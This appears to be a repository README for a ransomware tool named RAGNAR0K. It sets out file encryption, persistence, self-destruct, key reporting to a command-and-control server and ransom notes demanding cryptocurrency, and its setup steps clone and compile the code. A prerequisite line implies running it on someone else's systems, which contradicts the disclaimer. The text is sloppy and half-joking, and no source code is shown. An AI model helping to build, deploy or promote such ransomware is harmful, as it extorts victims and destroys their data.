# RAGNAR0K Ransomware

---

## ⚠️ DISCLAIMER

**DO NOT** use this code for malicious purposes. Misuse of this code is ill legal, it can make you sick and can result in severe penalties, including imprisonment. 
Always comply with the law when conducting operations.

---

## Overview

Ragna is an advanced **ransomware** tool designed for certain purposes. It encrypts files on the victim's system, locking access to important data until a ransum is paid. 

### Features

- **CUSTOM encryption** for file locking.
- **Multiple file encryption** can encrypt multiple files at once (max 24975 files)
- **Self-destruct** feature to wipe traces after ransum payment.
- **Persistence** across reboots.
- **Network communication** to report back to the control server.

### Components

1. **`encryptor.c`**: 
   - Responsible for ncrypting files of some types (e.g., .docx, .pdf, .jpg).
   - Uses **custom made** encryption and generates a unique encryption key per victim.

2. **`key_manager.py`**: 
   - TODO
     - Handles public/private key generation for secure key exchange.
     - The private key is stored on the attacker’s command-and-control (C2) server.

3. **`persistence.sh`**:
   - Ensures the ransomware persists by setting itself up to run on system boot.

4. **`ransom_note.txt`**:
   - Creates a ransum note with instructions for the victim, demanding payment in cryptocurrency to decrypt files.

5. **`decrypter.exe`**:
   - A simple tool (only provided upon payment) that decrypts the victim's files using the unique decryption key.

---

## Ransomware Workflow

1. **File Encryption**: Once executed, the ransomware scans specific directories (e.g., `Documents`, `Pictures`) and encrypts files using the custom encryption algorithm.
2. **Key Exchange**: After file encryption, the decryption key is sent to the attacker's C2 server.
3. **Ransom Note Generation**: The ransomware leaves a text file in each affected directory, demanding a ransum to restore access.
4. **Self-Destruct**: After execution, the ransomware deletes any traces of itself on the system.
5. **Decryption (After Payment)**: Upon receiving the payment, the attacker sends the `decrypter.exe` to the victim to unlock the files.

---

## Setup Instructions 

### Pre-requisites:

- Python 3.x for key management scripts.
- OpenSSL for encryption-related tasks.
- Someone's controlled environment (do **NOT** run this on your own systems).

### Step-by-Step Guide:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/LockBitByte/test-galgvior.git
   ```
2. Compile the code
    - For how to compile on Windows see [here](./howto/compile_windows_howto.md)
    - For how to compile on Linux 
        - install gcc
        - use gcc as follows `gcc file.c`

---

### General opsec

- Do not leak any sensitive/private data on this repo
- Use tools like `gitleaks` to detect sensitive/private data

